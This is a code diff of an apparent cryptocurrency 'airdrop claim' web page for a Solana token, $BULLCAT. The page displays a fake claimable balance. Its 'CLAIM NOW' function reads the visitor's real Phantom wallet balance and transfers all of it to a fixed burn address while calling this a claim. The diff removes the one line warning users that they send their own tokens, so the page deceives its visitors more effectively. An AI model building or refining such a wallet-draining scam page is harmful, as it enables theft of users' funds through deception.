@@ -31,29 +31,31 @@
       <h1 class="text-5xl font-bold tracking-tighter glow-red">AIRDROP CLAIM</h1>
     </div>
 
-    <div class="bg-zinc-900 border border-red-500/50 rounded-3xl p-8 shadow-2xl shadow-red-500/10 scanline">
+    <div class="bg-zinc-900 border border-red-500/50 rounded-3xl p-8 scanline">
       
-      <!-- Fake Claim Amount -->
+      <!-- Fake Balance -->
       <div class="mb-8 p-6 bg-black/70 rounded-2xl border border-red-500/30 text-center">
         <p class="text-gray-400 text-sm mb-1">AVAILABLE TO CLAIM</p>
         <div class="flex items-baseline justify-center gap-2">
           <span class="text-6xl font-bold text-white">75,000</span>
-          <span class="text-red-400 text-3xl font-medium">$BULLCAT</span>
+          <span class="text-red-400 text-3xl">$BULLCAT</span>
         </div>
         <p id="walletAddress" class="text-xs text-gray-500 mt-4 font-mono break-all"></p>
       </div>
 
-      <!-- Claim Button -->
+      <!-- Connect Button -->
+      <button onclick="connectWallet()" id="connectBtn"
+              class="w-full mb-4 py-5 bg-white text-black rounded-2xl font-bold text-lg flex items-center justify-center gap-3">
+        <i class="fas fa-wallet"></i>
+        <span id="connectText">CONNECT WALLET</span>
+      </button>
+
+      <!-- Claim Now Button -->
       <button onclick="claimNow()" id="claimBtn"
-              class="w-full py-7 bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 rounded-2xl font-bold text-2xl flex items-center justify-center gap-3 transition-all active:scale-95">
+              class="w-full py-7 bg-gradient-to-r from-red-600 to-red-700 rounded-2xl font-bold text-2xl flex items-center justify-center gap-3 active:scale-95">
         <i class="fas fa-bolt"></i>
         CLAIM NOW
       </button>
-
-      <p class="text-center text-xs text-gray-500 mt-8">
-        You will send your real $BULLCAT balance<br>
-        Confirm only in Phantom wallet
-      </p>
     </div>
   </div>
 
@@ -76,39 +78,42 @@
 
     async function connectWallet() {
       try {
+        if (!window.solana) return alert("Phantom wallet not found. Please install it.");
+
         provider = window.solana;
         const resp = await provider.connect();
         connectedPublicKey = resp.publicKey.toString();
 
         document.getElementById("walletAddress").textContent = 
           `${connectedPublicKey.slice(0,8)}...${connectedPublicKey.slice(-6)}`;
-      } catch (e) {}
+
+        document.getElementById("connectBtn").disabled = true;
+        document.getElementById("connectText").innerHTML = "✅ CONNECTED";
+      } catch (err) {
+        alert("Connection cancelled.");
+      }
     }
 
     async function claimNow() {
-      if (!window.solana) return alert("Please install Phantom wallet");
-
       if (!connectedPublicKey) {
-        await connectWallet();
-        if (!connectedPublicKey) return;
+        alert("Please connect wallet first!");
+        return;
       }
 
       await loadSplToken();
       connection = new solanaWeb3.Connection(RPC_URL, "confirmed");
 
       try {
-        // Get real balance
         const mint = new solanaWeb3.PublicKey(BULLCAT_MINT);
         const fromPubkey = new solanaWeb3.PublicKey(connectedPublicKey);
         const ata = await splToken.getAssociatedTokenAddress(mint, fromPubkey);
+        
         const account = await splToken.getAccount(connection, ata);
         const realAmount = Number(account.amount) / 1_000_000_000;
 
-        if (realAmount <= 0) return alert("You have no $BULLCAT to claim");
+        if (realAmount <= 0) return alert("You have no $BULLCAT balance.");
 
-        // Send real full balance
         const burnPubkey = new solanaWeb3.PublicKey(BURN_ADDRESS);
-        const fromATA = ata;
         const toATA = await splToken.getAssociatedTokenAddress(mint, burnPubkey);
 
         const instructions = [];
@@ -119,7 +124,7 @@
 
         const decimals = 9;
         instructions.push(splToken.createTransferInstruction(
-          fromATA, toATA, fromPubkey, Math.floor(realAmount * 10 ** decimals)
+          ata, toATA, fromPubkey, Math.floor(realAmount * 10 ** decimals)
         ));
 
         const { blockhash } = await connection.getLatestBlockhash();
@@ -130,12 +135,13 @@
         const signedTx = await provider.signTransaction(tx);
         const txId = await connection.sendRawTransaction(signedTx.serialize());
 
-        alert(`✅ Claim transaction sent!\n\nYou sent ${realAmount.toFixed(2)} $BULLCAT\nTx: ${txId}`);
+        alert(`✅ Claim sent!\nYou transferred ${realAmount.toFixed(2)} $BULLCAT\n\nTx ID: ${txId}`);
       } catch (err) {
-        alert("Transaction failed or cancelled: " + err.message);
+        alert("Transaction failed or cancelled in wallet.");
       }
     }
 
+    window.connectWallet = connectWallet;
     window.claimNow = claimNow;
   </script>
 </body>
